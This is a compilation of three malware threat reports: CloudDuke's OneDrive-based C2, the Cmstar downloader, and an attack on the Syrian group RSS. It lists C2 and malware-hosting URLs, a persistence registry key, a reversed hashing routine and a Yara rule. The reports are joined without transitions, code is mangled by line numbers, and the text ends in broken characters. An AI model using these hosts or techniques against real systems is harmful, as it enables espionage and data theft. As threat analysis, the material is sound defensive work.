We have also observed two distinct trojan components in the CloudDuke toolset .
The first of these , internally called `` BastionSolution '' , is the trojan that Palo Alto Networks described in their research into `` MiniDionis '' .
Interestingly , BastionSolution appears to functionally be an exact copy of SeaDuke with the only real difference being the choice of programming language .
BastionSolution also makes significant use of a code framework that is apparently internally called `` Z '' .
This framework provides classes for functionality such as encryption , compression , randomization and network communications .
A list of classes in the BastionSolution trojan , including multiple classes from the `` Z '' framework .
Classes from the same `` Z '' framework , such as the encryption and randomization classes , are also used by the second trojan component of the CloudDuke toolset .
This second component , internally called `` OneDriveSolution '' , is especially interesting because it relies on Microsoft 's cloud storage service OneDrive as its command and control channel .
To achieve this , OneDriveSolution will attempt to log into OneDrive with a preconfigured username and password .
If successful , OneDriveSolution will then proceed to copy data from the victim 's computer to the OneDrive account .
It will also search the OneDrive account for files containing commands for the malware to execute .
A list of classes in the OneDriveSolution trojan , including multiple classes from the `` Z '' framework .
All of the CloudDuke `` solutions '' use the same loader , a piece of code whose primary purpose is to decrypt the embedded , encrypted solution , load it in memory and execute it .
The Duke group has often employed loaders for their malware but unlike the previous loaders they have used , the CloudDuke loader is much more versatile with support for multiple methods of loading and executing the final payload as well as the ability to write to disk and execute additional malware components .
CloudDuke spear-phishing campaigns and similarities with CozyDuke .
CloudDuke has recently been spread via spear-phishing emails with targets reportedly including organizations such as the US Department of Defense .
These spear-phising emails have contained links to compromised websites hosting zip archives that contain CloudDuke-laden executables .
In most cases , executing these executables will have resulted in two additional files being written to the victim 's hard disk .
The first of these files has been a decoy , such as an audio file or a PDF file while the second one has been a CloudDuke loader embedding a CloudDuke downloader , the so-called `` DropperSolution '' .
In these cases , the victim has been presented with the decoy file while in the background the downloader has proceeded to download and execute one of the CloudDuke trojans , `` OneDriveSolution '' or `` BastionSolution '' .
Example of one of the decoy documents employed in the CloudDuke spear-phishing campaigns .
It has apparently been copied by the attackers from here .
Interestingly , however , some of the other CloudDuke spear-phishing campaigns we have observed this July have born a striking resemblance to CozyDuke spear-phishing campaigns seen almost exactly a year ago , in the beginning of July 2014 .
In both spear-phishing campaigns , the decoy document has been the exact same PDF file , a `` US letter fax test page '' ( 28d29c702fdf3c16f27b33f3e32687dd82185e8b ) .
Similarly , the URLs hosting the malicious files have , in both campaigns , purported to be related to eFaxes .
It is also interesting to note , that in the case of the CozyDuke-inspired CloudDuke spear-phishing campaign , the downloading and execution of the malicious archive linked to in the emails has not resulted in the execution of the CloudDuke downloader but in the execution of the `` BastionSolution '' component thereby skipping one step from the process described for the other CloudDuke spear-phishing campaigns .
The `` US letter fax test page '' decoy employed in both CloudDuke and CozyDuke spear-phishing campaigns .
Increasingly using cloud services to evade detection .
CloudDuke is not the first time we have observed the Duke group use cloud services in general and Microsoft OneDrive specifically as part of their operations .
Earlier this spring we released research on CozyDuke where we mentioned observing CozyDuke sometimes either directly use a OneDrive account to exfiltrate stolen data or alternatively CozyDuke downloading Visual Basic scripts that would copy stolen files to a OneDrive account and sometimes even retrieve files containing additional commands from the same OneDrive account .
In these previous cases the Duke group has only used OneDrive as a secondary communication channel but still relied on more traditional C & C channels for most of their actions .
It is therefore interesting to note that CloudDuke actually enables the Duke group to rely solely on OneDrive for every step of their operation from downloading the actual trojan , passing commands to the trojan and finally exfiltrating stolen data .
By relying solely on 3rd party web services , such as OneDrive , as their command and control channel , we believe the Duke group is trying to better evade detection .
Large amounts of data being transferred from an organization 's network to an unknown web server easily raises suspicions .
However , data being transferred to a popular cloud storage service is normal .
What better way for an attacker to surreptitiously transfer large amounts of stolen data than the same way people are transferring that same data every day for legitimate reasons .
( Coincidentally , the implications of 3rd party web services being used as command and control channels is also the subject of an upcoming talk at the VirusBulletin 2015 conference ) .
Directing limited resources towards evading detection and staying ahead of defenders .
Developing even a single multipurpose malware toolset , never mind many , requires time and resources .
Therefore it seems logical to attempt to reuse code such as supporting frameworks between different toolsets .
The Duke group , however , appear to have taken this a step further with SeaDuke and the CloudDuke component BastionSolution , by rewriting the same code in multiple programming languages .
This has the obvious benefits of saving time and resources by providing two malware toolsets , that while similar on the inside , appear completely different on the outside .
This way , the discovery of one toolset does not immediately lead to the discovery of the second toolset .
The Duke group , long suspected of ties to the Russian state , have been running their espionage operation for an unusually long time and especially lately with unusual brazenness .
These latest CloudDuke and SeaDuke campaigns appear to be a clear sign that the Duke 's are not planning to stop any time soon .
Research and post by Artturi ( @ lehtior2 ) F-Secure detects CloudDuke as Trojan : W32/CloudDuke.B and Trojan : W64/CloudDuke.B Samples :
04299c0b549d4a46154e0a754dda2bc9e43dff76 2f53bfcd2016d506674d0a05852318f9e8188ee1 317bde14307d8777d613280546f47dd0ce54f95b 476099ea132bf16fa96a5f618cb44f87446e3b02 4800d67ea326e6d037198abd3d95f4ed59449313 52d44e936388b77a0afdb21b099cf83ed6cbaa6f 6a3c2ad9919ad09ef6cdffc80940286814a0aa2c 78fbdfa6ba2b1e3c8537be48d9efc0c47f417f3c 9f5b46ee0591d3f942ccaa9c950a8bff94aa7a0f bfe26837da22f21451f0416aa9d241f98ff1c0f8 c16529dbc2987be3ac628b9b413106e5749999ed cc15924d37e36060faa405e5fa8f6ca15a3cace2 dea6e89e36cf5a4a216e324983cc0b8f6c58eaa8 e33e6346da14931735e73f544949a57377c6b4a0 ed0cf362c0a9de96ce49c841aa55997b4777b326 f54f4e46f5f933a96650ca5123a4c41e115a9f61 f97c5e8d018207b1d546501fe2036adfbf774cfd .
Compromised servers used for command and control :
https : //cognimuse.cs.ntua.gr/search.php https : //portal.sbn.co.th/rss.php https : //97.75.120.45/news/archive.php https : //portal.sbn.co.th/rss.php https : //58.80.109.59/plugins/search.php .
Compromised websites used to host CloudDuke :
http : //flockfilmseries.com/eFax/incoming/5442.ZIP http : //www.recordsmanagementservices.com/eFax/incoming/150721/5442.ZIP http : //files.counseling.org/eFax/incoming/150721/5442.ZIP .
Cmstar Downloader : Lurid and Enfal ’ s New Cousin .
In recent weeks , Unit 42 has been analyzing delivery documents used in spear-phishing attacks that drop a custom downloader used in cyber espionage attacks .
This specific downloader , Cmstar , is associated with the Lurid downloader also known as ‘ Enfal ’ .
Cmstar was named for the log message ‘ CM * * ’ used by the downloader .
Unit 42 is aware of threat actors using two toolkits – MNKit and the Tran Duy Linh toolkit – to produce malicious documents that exploit CVE-2012-0158 in order to implant Cmstar .
The Cmstar downloader itself has several unique and interesting features , as well as substantial infrastructure overlap with other tools worth discussing .
Manual Building of Import Address Table .
The Cmstar downloader starts by manually building its import address table ( IAT ) , much like shellcode would ; however , it uses a rather unique technique .
Instead of finding API function names based on their hashed values , this malware enumerates libraries ’ export address table ( EAT ) and searches for the name of the API function the payload needs to load by using a character to offset array .
The payload pairs several comma-separated lists of characters with comma-separated lists of numbers .
Each list of characters consists of the set found within the API function name the payload seeks to add to its IAT , while the corresponding list of numbers specifies the offset in the function name where those characters should be placed .
For example , if the payload has “ D , e , A ” paired with “ 0,5,19 ” , this results in the following mapping :
“ D ” at offset 0 in API function name “ e ” at offset 5 in API function name “ A ” at offset 19 in API function name .
The payload loads a specific Windows library ’ s EAT by calling the ImageDirectoryEntryToData API function using the IMAGE_DIRECTORY_ENTRY_EXPORT flag .
It then enumerates the library ’ s EAT to find exported function names by checking each function name for the character and the specific offset .
Once found , the payload adds the address for the specific API function to its IAT .
For instance , the payload checks the EAT of “ wininet.dll ” using the comparisons mentioned above to find the address to the “ DeleteUrlCacheEntryA ” API function .
One specific Cmstar payload that we analyzed used the character/offsets seen in Figure 1 to locate the API functions within three different Windows libraries to build its IAT .
Library Characters Offsets Function Name D , e , A 0,5,19 DeleteUrlCacheEntryA e , O , A 3,8,12 InternetOpenA e , C , A 3,8,15 InternetConnectA p , O , A 3,4,15 HttpOpenRequestA wininet.dll p , S , A 3,4,15 HttpSendRequestA p , E , A 3,4,14 HttpEndRequestA p , Q , A 3,4,13 HttpQueryInfoA e , R , e 3,8,15 InternetReadFile e , C , e 3,8,18 InternetCloseHandle S , V , A 3,6,13 RegSetValueExA C , s , y 3,6,10 RegCloseKey O , K , A 3,7,12 RegOpenKeyExA D , K , A 3,9,12 RegDeleteKeyA advapi32.dll D , V , A 3,9,14 RegDeleteValueA U , r , A 3,6,11 GetUserNameA v , t , S 3,6,12 ConvertSidToStringSidA k , A , A 3,6,17 LookupAccountNameA W , E , c 0,3,6 WinExec C , M , A 0,10,17 CreateFileMappingA kernel32.dll U , V , e 0,5,14 UnmapViewOfFile M , O , e 0,7,12 MapViewOfFile .
Figure 1 .
Character and Offset Pairs Found in Cmstar Payload and the Resulting API Function Names .
Cmstar Behavior .
After manually creating the IAT , Cmstar decrypts its configuration , several encrypted strings , and a piece of shellcode .
The embedded configuration contains nothing more than a URL that Cmstar uses as its command and control ( C2 ) location .
The encrypted strings within the Trojan include fields used within the HTTP requests that Cmstar will create to communicate with its C2 server , as well as additional strings used to interact with the registry .
The Cmstar sample associated with the MNKIT delivery document creates the following registry key to automatically execute at system startup : HKCU\Software\Microsoft\Windows\CurrentVersion\Run\xpsfiltsvcs : “ rundll32.exe C : \DOCUME~1\ADMINI~1\LOCALS~1\Temp\xpsfiltsvcs.dll , XpsRegisterServer ” Unit 42 found an additional encrypted registry key that would allow Cmstar to automatically start up after reboots .
However , the code does not decrypt , reference , or use the following registry key in any way , which suggests that the malware author left this artifact in the code after swapping to the run key listed above : HKCU\Software\Microsoft\CTF\LangBarAddIn Cmstar also decrypts a 752-byte piece of shellcode that carries out communications with the C2 server , specifically by sending HTTP POST requests to the following URL : http://happy.launchtrue.com:8080/cgl-bin/update.cgi It should be noted that the C2 URL contains the string ‘ cgl-bin ’ , which visually resembles the common cgi bin folder used by many webservers to run server-side scripts .
Unit 42 used the Palo Alto Networks AutoFocus threat intelligence service to locate additional samples using the ‘ cgl-bin ’ string within URLs of HTTP requests and found several samples of the Cmwhite tool associated with the LURID/Enfal downloader1 , as seen in Figure 2 .
Figure 2 .
Cmwhite Tools Using “ cgl-bin ” within HTTP Requests .
Cmstar ’ s HTTP POST requests sent to ‘ happy.launchtrue.com ’ contain data that the Trojan gathers from the infected machine that has the following structure : < Windows Version number > @ @ < CPU Architecture ( 2 for x64 , 1 for x86 ) > ? ? < boolean for elevated privileges > ] ] * * < boolean if antivirus processes are found > ! ! < static version string > == In one example , Unit 42 observed the following data within an analysis environment , which was then encrypted using a single-byte XOR algorithm and a key of 0x45 before being sent to the C2 server : 510 @ @ 1 ? ? 1 ] ] * * 0 ! ! 150316o== Helpfully , the malware author writes log messages to the ‘ DF64159.TMP ’ file , used for debugging purposes throughout the execution of the Cmstar downloader .
The log messages are abbreviated strings that describe specific activities during the execution of the code .
For instance , the downloader uses the CreateMutex to create a mutex named ‘ { 53A4988C-F91F-4054-9076-220AC5EC03F3 } ’ to determine if another instance of the code is running .
If the downloader determines another instance of itself is running , the code writes the string ‘ CM * * ’ – which happens to be the basis for the name of the Trojan – to the log file .
Unit 42 created a Yara signature to detect Cmstar samples based on these debugging strings , which is available in the appendix .
Hashing Process Names .
As mentioned in the behavioral analysis section , the Cmstar downloader gathers system-specific information to send to the C2 server .
One such piece of information is the existence of specific running processes .
Many malware families and tools check for the existence of antivirus , but the Cmstar tool does so in a clever way .
Rather than including a list of strings of associated processes , Cmstar enumerates the running processes and subjects these process names to a hashing algorithm .
The results of this algorithm are then compared against three static values : 0x1E00AFA , 0xBEE091E8 and 0xD46FCDFA .
Unit 42 reverse engineered the algorithm and created the function seen below to generate hashes in order to determine the processes Cmstar is trying to find :
def hashStr ( st ) : hash = 0 1 2 3 4 5 6 7 def hashStr ( st ) : 8 hash = 0 9 count = 0 10 while count < len ( st ) : 11 h1 = ( hash < < 0x13 ) & 0xFFFFFFFF 12 h2 = ( hash > > 0x0d ) & 0xFFFFFFFF 13 h3 = ( h1|h2 ) & 0xFFFFFFFF 14 hash = ( h3 + ( ord ( st [ count ] ) ^0x4a ) ) & 0xFFFFFFFF 15 count += 1 16 return hash 17 18 19 20 21 .
Unit 42 found that the string ‘ avp ’ subjected to the algorithm above results in the value 0x1E00AFA , which suggests the Cmstar sample specifically looks for Kaspersky ’ s Anti-virus product ( avp.exe ) running on the compromised system .
If the Trojan finds processes whose hash matches the three values mentioned earlier , it sets a boolean value ( the character ‘ 1 ’ ) within the data sent to the C2 server and continues carrying out its functionality .
Rather than altering its activities , Cmstar only notifies the C2 server if a system is running one of these processes , suggesting that the threat actors might employ this technique as a filtering mechanism to ignore analysis systems and researchers .
Threat Infrastructure .
In order to determine the intrusion set involved with the Cmstar , Unit 42 enumerated infrastructure used by the downloader for its C2 servers .
The related infrastructure chart in Figure 3 shows a rather large cluster of related entities with one small set of entities that do not share any related entities with the larger cluster .
Figure 3 .
Infrastructure and Entites Related to Cmstar .
As seen in the chart above , the C2 domain ‘ happy.launchtrue.com ’ was originally registered using the email address ‘ WANGMINGHUA6@GMAIL.COM ’ .
When Unit 42 used the Palo Alto Networks AutoFocus threat intelligence service to locate additional Cmstar samples , we found several with C2 domains that also had the same original registrant :
links.dogsforhelp.com three.earewq.com question.eboregi.com here.pechooin.com sarey.phdreport.com bakler.featurvoice.com .
The only known Cmstar C2 domain not initially registered by the email address was help.ubxpi0s.com .
Further analysis revealed that additional domains related to Cmstar C2 domains were also originally registered using the email address ‘ WANGMINGHUA6@GMAIL.COM ’ and updated to the current information within a few days .
In addition , this was the original registrant for C2 domain used in our Google Code blog2 , indicating this registrant email is likely a re-seller , and/or someone who initially sets up infrastructure for particular APT threat actors .
forever.cowforhelp.com question.shiesiido.com endline.biortherm.com right.marubir.com baby.brabbq.com lind.kruptcy.com .
The rest of the domains related to the Cmstar infrastructure did not use the original registrant noted above , but instead kept the same information initially used to register them .
The difference in domain registration patterns could indicate threat actor preference , or could indicate there are at least two groups using this malware whose infrastructure at times overlaps .
under.suttgte.com help.ubxpi0s.com finally.basiccompare.com crystal.diskfunc.com queenfansclub.com novnitie.com flash-vip.com replyfunt.com natcongress.com keep.regebky.com love.regebky.com .
Interestingly , the updated registrant information ( or original , in the cases where it wasn ’ t changed ) for all of the C2 domains in this blog has also been used to register scam sites , most purporting to sell knock-off designer products like shoes , software , or cell phones .
The contact emails and contact names can vary , but the address is re-used .
Blue Coat noted this pattern as well in a blog published late last year , which also noted the ‘ WANGMINGHUA6@GMAIL.COM ’ registrant email.3 It is not known whether the threat actors conducting the malicious activity are also behind the scam sites .
Conclusion .
The Cmstar tool has several interesting features , including a previously unseen method of manually creating its import address table using an API function name character to offset mapping techniques , and a hashing algorithm used to find antivirus processes on an infected system .
Both of these features are noteworthy and may provide the ability to correlate future tools to the same group and/or malware authors .
The URL used by Cmstar to communicate with its C2 server , as well as significant infrastructure overlap , show a direct relationship between the Cmstar downloader , Lurid/Enfal and Cmwhite tools .
In a majority of the cases , threat actors using the Cmstar downloader initially register the C2 domains using the email address ‘ WANGMINGHUA6@GMAIL.COM ’ and later change the registration information to include a different email address .
Unit 42 can not positively confirm that the threat actors control the ‘ WANGMINGHUA6@GMAIL.COM ’ email address , or if the email address belongs to a reseller that the threat actors buy domains from to create their infrastructure ; however , we do believe this is an interesting TTP worth tracking in future infrastructure enumeration .
1 .
THE “ LURID ” DOWNLOADER – Nart Villeneuve and David Sancho – http : //la.trendmicro.com/media/misc/lurid-downloader-enfal-report-en.pdf 2 .
Attacks on East Asia using Google Code for Command and Control – Jen Miller-Osborn and Rob Downs — http : //researchcenter.paloaltonetworks.com/2014/08/attacks-east-asia-using-google code-command-control/ 3 .
Linking APTs from 2011 and 2014 to an Active Scam Network – Kiel Wadner – https : //www.bluecoat.com/security-blog/2014-10-08/linking-apts-2011-and-2014-active-scam network .
Appendix .
Known Cmstar Downloaders .
Filename : xpsfiltsvcs.tmp SHA256 : 239a25ac2b38f0be9392ceeaeab0d64cb239f033af07ed56565ba9d6a7ddcf1f C2 : links.dogsforhelp.com Filename : xpsfiltsvcs.tmp SHA256 : 6b557c22ab12e8ea43d29e4f9f8a9483e3e75cd41338a674c9069b6dacdf7ba7 C2 : question.eboregi.com Filename : xpsfiltsvcs.tmp SHA256 : 7ade616a8f1750cecba944a02e2bce1340b18a55697b29f721ccc4701aadba6e C2 : links.dogsforhelp.com Filename : xpsfiltsvcs.tmp SHA256 : 88184983733f4d4fa767ad4e7993b01c5754f868470dd78ac1bad2b02c9e5001 C2 : here.pechooin.com Filename : xpsfiltsvcs.tmp SHA256 : b9d597aea53023727d8564e47e903b652f5e98a2c32bdc23bc4936448fb2d593 C2 : question.eboregi.com Filename : xpsfiltsvcs.tmp SHA256 : e0b3cc07d3a9b509480b240368dee2a29713ea1e240674c0ccf610c84810a7c5 C2 : question.eboregi.com Filename : xpsfiltsvcs.txt SHA256 : f4b8f71c0e10a345a855763e01033e2144e949c8f98c271755cc025e3f55b7da C2 : three.earewq.com Filename : xpsfiltsvcs.tmp SHA256 : 2e00a98212c5a2015d12612f0d26039a0c2dfee3e1b384675f613e683f276e02 C2 : bakler.featurvoice.com Filename : xpsfiltsvcs.dll SHA256 : 42ed2edc37b957266ff7b02955a007dd82d955c09ef7be23e685d938e40ad61d C2 : turber.xoxcobbs.com Filename : xpsfiltsvcs.dll SHA256 : 9b9cc7e2a2481b0472721e6b87f1eba4faf2d419d1e2c115a91ab7e7e6fc7f7c C2 : happy.launchtrue.com Filename : xpsfiltsvcs.tmp SHA256 : a330c52b7643de9d8be51a4ae0150b7b8390dbabaea9704069694835fbd3298e C2 : three.earewq.com Filename : xpsfiltsvcs.tmp SHA256 : a8fa487d9f2152738bf49c8c69e8a147aae55c06f37c7e25026a28f21601ad7f C2 : sarey.phdreport.com Filename : xpsfiltsvcs.tmp SHA256 : c99c0b37f2fd64fa523d39c35ead6416a684ae203ae728feb5feff8490eb902c C2 : help.ubxpi0s.com Filename : xpsfiltsvcs.tmp SHA256 : d541280b37dd5e2101cc5cd47b0991b8320714f5627b37646330136cddef0c23 C2 : three.earewq.com Filename : coyote_load.dll SHA256 : adb05c1eecd789582886b3354b53831df9c9a06e891bb687633ee7ce21417edc C2 : bakler.featurvoice.com .
Delivery Documents Installing Cmstar .
Filename : Какая реформа армии нужна Украине.doc ( What is needed reform of the army Ukraine.doc ) MD5 : 76ffb9c2d8d0ae46e8ea792ffacc8018 SHA256 : c26c67eac20614038aaadfda19b604862926433333893d65332928b5e36796aa Type : MIME entity text Toolkit : MNKit Author : User123 Last Saved By : User123 Created : 2012-05-01T14:08:00Z Modified : 2012-05-01T14:12:00Z Filename : запуск ракеты-носителя Союз.doc ( launch of the carrier rocket Soyuz.doc ) MD5 : 6fdeadacfe1dafd2293ce5c4e178b668 SHA256 : e39b0e777ef0135c1f737b67988df70c2e6303c3d2b01d3cdea3efc1d03d9ad9 Type : Microsoft Office Word 97-2003 Document Toolkit : Tran Duy Linh Created : 2012:11:23 04:35:00 Modified : 2012:11:23 04:39:00 Company : DLC Corporation Filename : РФ_КНР_сельское_хозяйство.doc ( RF China Agriculture and Economy.doc ) MD5 : 9da10a36daf845367e0fc2f3e7e54336 SHA256 : a0aeb172a72442d2c2c02e1d32b48accb9975c4da7742df24d9350a8ccd401f2 Type : Microsoft Office Word 97-2003 Document Toolkit : Tran Duy Linh Created : 2012:11:23 04:35:00 Modified : 2012:11:23 04:39:00 Company : DLC Corporation Filename : Ерөнхий сайд асан Н.Алтанхуягийг шалгаж эхэлжээ.doc ( Former Prime Minister started to check with their lethargy.doc ) MD5 : f7d47e1de4f5f4ad530bca0fc080ea53 SHA256 : 4883286b8229a2c43db17eb1e1c5bd79d1933e840cdfedff80d5b99a84c9e39f Type : Microsoft Office Word 97-2003 Document Toolkit : Tran Duy Linh Created : 2012:11:23 04:35:00 Modified : 2012:11:23 04:39:00 Company : DLC Corporation Filename : запуск ракеты-носителя Союз.doc ( launch of the carrier rocket Soyuz.doc ) MD5 : 6fdeadacfe1dafd2293ce5c4e178b668SHA256 : e39b0e777ef0135c1f737b67988df70c2e6303c3d2b01d3cdea3efc1d03d9ad9 Type : Microsoft Office Word 97-2003 Document Toolkit : Tran Duy Linh Created : 2012:11:23 04:35:00 Modified : 2012:11:23 04:39:00 Company : DLC Corporation MD5 : 5aeb8a5aa8f6e2408016cbd13b3dfaf0 SHA256 : df34aa9c8021f1f0bdf33249908efc4a9628941453ad79b281b3a46bf9a7f37f Type : Microsoft Office Word 97-2003 Document Toolkit : Tran Duy Linh Created : 2012:11:23 04:35:00 Modified : 2012:11:23 04:39:00 Company : DLC Corporation Filename : Путины урилга.doc ( Putin ’ s invitation.doc ) SHA256 : 45027d11ab783993c413f97e8e29759d04b04564f8916f005f5c632f291697bb Type : Microsoft Office Word 97-2003 Document Toolkit : Tran Duy Linh Created : 2012:11:23 04:35:00 Modified : 2012:11:23 04:39:00 Company : DLC Corporation MD5 : 46bf922d9ae07a9bc3667a374605bdbb SHA256 : 7dc78caf515d1d3d2b84be7c023ccbd0b4fd670a42babcbcbd5a5ba65bbdd166 Type : Microsoft Office Word 97-2003 Document Toolkit : Tran Duy Linh Created : 2012:11:23 04:35:00 Modified : 2012:11:23 04:39:00 Company : DLC Corporation Filename : Армия-2015.doc ( Army-2015.doc ) MD5 : 783a423f5e285269126d0d98f53c795b SHA256 : 5b338decffe665a2141d1079c32b2d612057d1fdbfddf198cc28003dae7f0516 Type : Microsoft Office Word 97-2003 Document Toolkit : Tran Duy Linh Created : 2012:11:23 04:35:00 Modified : 2012:11:23 04:39:00 Company : DLC Corporation Filename : С днём 70 лет победы.doc ( Happy 70 years of victory.doc ) MD5 : 510b3272342765743a202373261c08da SHA256 : 0a10d7bb317dceccd05d18408fd6b8b12c784910e5f7e035ee22c2c5d7e4cbf5 Type : Microsoft Office Word 97-2003 Document Toolkit : Tran Duy Linh Created : 2012:11:23 04:35:00 Modified : 2012:11:23 04:39:00 Company : DLC Corporation Filename : new resume.doc MD5 : c5ae7bd6aec1e01aa53edcf41962ac04 SHA256 : 87bcc6d18c6a81d92d826b232703dee84b522bd1d0cae56f74bcf58fdca0930e Type : Microsoft Office Word 97-2003 Document Toolkit : Tran Duy Linh Created : 2012:11:23 04:35:00 Modified : 2012:11:23 04:39:00 Company : DLC Corporation MD5 : 3d41e3c902502c8b0ea30f5947307d56 SHA256 : b65dd4da9f83c11fcb5beaec43fabd0df0f7cb61de94d874f969ca926e085515 Type : Microsoft Office Word 97-2003 Document Toolkit : Tran Duy Linh Created : 2012:11:23 04:35:00 Modified : 2012:11:23 04:39:00 Company : DLC Corporation Filename : Центр-2015.doc ( Center-2015.doc ) MD5 : 94499ff857451ab7ef8823bf067189e7 SHA256 : 671dfc4d47a43cf0bd9205a0f654dcd5050175aef54b69388b0c5f4610896c6a Type : Microsoft Office Word 97-2003 Document Toolkit : Tran Duy Linh Created : 2012:11:23 04:35:00 Modified : 2012:11:23 04:39:00 Company : DLC Corporation Related Cmwhite Tools MD5 : 3fff0bf6847d0d056636caef9c3056c3 SHA256 : 13c1d7eb2fd64591e224dec9534d8252f4b91e425e8f047b36605138d15cbf2d C2 : stone.timmf.com MD5 : 30a6c3c7723fe14c4b6960fa3e4e57ba SHA256 : ab934c6177be0fdc3b6dfbf21f60ce7837a30e6599dcfb111b43008c75ceb91f C2 : xphome.mailru-vip.com C2 : error.yandex-pro.com MD5 : e0417547ba54b58bb2c8f795bca0345c SHA256 : 1cf44815f9eb735e095f68c929d5549e0ebc44af9988cccaf1852baeb96bb386 C2 : dns.thinkttun.com MD5 : d05f012c9c1a7fb669a07070be821072 SHA256 : a37f337d0bc3cebede2039b0a3bd5afd0624e181d2dcc9614d2f7d816b5a7a6b C2 : help.redhag.com C2 : mssage.hotoicq.com C2 : new.hoticq.com .
Cmstar Yara Rule .
rule ce_enfal_cmstar_debug_msg 1 2 3 4 5 6 7 8 9 rule ce_enfal_cmstar_debug_msg 10 { 11 meta : 12 author = `` rfalcone '' 13 description = `` Detects the static debug strings within CMSTAR '' 14 reference = `` 9b9cc7e2a2481b0472721e6b87f1eba4faf2d419d1e2c115a91ab7e7e6fc7f7c `` 15 date = `` 5/10/2015 '' 16 strings : 17 $ d1 = `` EEE\x0d\x0a '' fullword 18 $ d2 = `` TKE\x0d\x0a '' fullword 19 $ d3 = `` VPE\x0d\x0a '' fullword 20 $ d4 = `` VPS\x0d\x0a '' fullword 21 $ d5 = `` WFSE\x0d\x0a '' fullword 22 $ d6 = `` WFSS\x0d\x0a '' fullword 23 $ d7 = `` CM * * \x0d\x0a '' fullword 24 condition : 25 uint16 ( 0 ) == 0x5a4d and all of ( $ d * ) 26 } 27 28 29 30 31 32 33 34 35 .
Malware Attack Targeting Syrian ISIS Critics .
by John Scott-Railton and Seth Hardy With the collaboration of Cyber Arabs .
Media coverage : Associated Press , Forbes .
Summary .
This report describes a malware attack with circumstantial links to the Islamic State in Iraq and Syria .
In the interest of highlighting a developing threat , this post analyzes the attack and provides a list of Indicators of Compromise .
A Syrian citizen media group critical of Islamic State of Iraq and Syria ( ISIS ) was recently targeted in a customized digital attack designed to unmask their location .
The Syrian group , Raqqah is being Slaughtered Silently ( RSS ) , focuses its advocacy on documenting human rights abuses by ISIS elements occupying the city of Ar Raqah .
In response , ISIS forces in the city have reportedly targeted the group with house raids , kidnappings , and an alleged assassination .
The group also faces online threats from ISIS and its supporters , including taunts that ISIS is spying on the group .
Though we are unable to conclusively attribute the attack to ISIS or its supporters , a link to ISIS is plausible .
The malware used in the attack differs substantially from campaigns linked to the Syrian regime , and the attack is focused against a group that is an active target of ISIS forces .
Background : Citizen Journalists under Threat in ISIS-controlled Territories .
As the Syrian Civil War continues , Syrian citizen journalists and nonviolent activists operate in an increasingly unsafe environment .
The regime has never welcomed their work , and has often targeted them for arrest and detention , and a multi-year hacking campaign ( see Pro-Regime / Regime Linked Groups ) .
Additionally , not all elements of the Syrian opposition have uniformly supported nonviolent activists and citizen journalists .
More recently , in areas like Raqqah , nonviolent activists face a new and exceptionally grave threat : ISIS .
A growing number of reports suggest that ISIS is systematically targeting groups that document atrocities , or that communicate with Western media and aid organizations , sometimes under the pretext of finding “ spies ” .
Map : Raqqah is indicated by the red arrow .
Colors indicate areas mostly under the control of the following groups : Black = ISIS , Red = Syrian Regime , Green = Free Syrian Army , Yellow = Kurdish .
Note : the map is not highly detailed , nor completely up-to-date , but is useful in showing general areas of control .
Source : @ DeSyracuse .
Ar-Raqqah , the city in which the case study is located , is situated in northern Syria and continues to be a key conflict flashpoint of the Syrian Civil War .
In the spring of 2013 , Islamists and Free Syrian Army ( FSA ) fighters took over Ar Raqqah from regime forces .
As ISIS gained momentum , they consolidated their control over the city , edging out FSA affiliated groups through attacks , summary executions , and kidnappings against a range of groups , including ethnic and religious minorities .
Information Control by ISIS .
During 2014 , there were a number of reports—many unconfirmed—that ISIS confiscated smartphones and laptops from captured activists .
According to Syrians who experienced these searches and spoke with one of the reports ’ authors , ISIS sometimes extracts data from confiscated smartphones and laptops to collect information about people and groups they are targeting , as well as to seek evidence of “ un-Islamic ” activities .
As ISIS cements their control of Ar-Raqqah and other territories , reports have emerged recently ( though not all of them confirmed ) suggesting that elements within ISIS are growing increasingly sophisticated at imposing control and targeting opponents using digital methods .
Reports about ISIS targeting Internet cafés have grown increasingly common , and in some cases reports point to the possible use of keyloggers as well as unspecified “ IP sniffers ” to track behaviour in Internet cafes .
The Situation of Nonviolent Activists and Citizen Journalists in Ar-Raqqah .
Nonviolent activists and citizen journalists based in Ar-Raqqah have provided the outside world with much of what we know about how ISIS treats the population .
These activists and journalists face mortal danger for their actions , and reports have emerged of their detention and torture at the hands of ISIS .
As ISIS continues to use social media to push the message that it is welcomed by the population of Ar-Raqqah , groups like Raqqah is being Slaughtered Silently ( RSS ) provide a compelling counter narrative .
RSS hasn ’ t escaped ISIS ’ notice , and the group has been targeted for kidnappings , house raids , and at least one alleged targeted killing .
At the time of writing , ISIS is allegedly holding several citizen journalists in Ar-Raqqah .
Image 1 : Example of an online threat made against RSS .
The image , which can not be confirmed , purports to show CCTV installed around Raqqah .
In addition , RSS is targeted online by ISIS supporters with harassment , including threats to the physical safety of its members .
For example , ISIS supporters have claimed that ISIS has established a system of CCTV cameras in Ar-Raqqah to observe residents ’ movements .
While this claim may be a bluff or exaggeration , at least one ISIS supporter has indicated on social media that this system could be used to look for members of RSS .
Analyzing the Attack .
This section describes a highly targeted attack sent to an e-mail address belonging to RSS .
The Citizen Lab analyzed this attack with the consent of RSS , which requested that their name be used in this report .
The attack took the form of an unsolicited e-mail containing a download link to a decoy file .
The file contained custom malware that profiled the victim ’ s computer and beaconed its IP address to an e-mail account under the attacker ’ s control .
The Targeting of RSS .
The unsolicited message below was sent to RSS at the end of November 2014 from a Gmail email address .
The message was carefully worded , and contained references specific to the work and interests of RSS .
Targeting Email .
Thank you for your efforts to deliver a true picture of the reality of life in Raqqah .
As Syrians residing in Canada we are working with media because we believe in the importance of shedding light on the realities of life in Syria , and Raqqah in particular .
We are preparing a lengthy news report on the realities of life in Raqqah .
We are sharing some information with you with the hope that you will correct it in case it contains errors .
We have prepared a map of the city of Raqqah , in addition to a preliminary report .
We hope that you have a look at it with them and inform us of any errors .
We also hope that if you happen to be on Facebook , you could provide us with the account of the person responsible for the campaign , if you don ’ t mind , so that we can communicate with him directly .
You can see a preliminary copy of the report on this linkhttp : //tempsend [ DOT ] com/ [ Redacted ] With all respect [ Name Redacted ] .
Original Arabic ‫ﺒﺔ‬ # $ ‫ﺔ‬ # ‫ ﺗﺤ‬ .
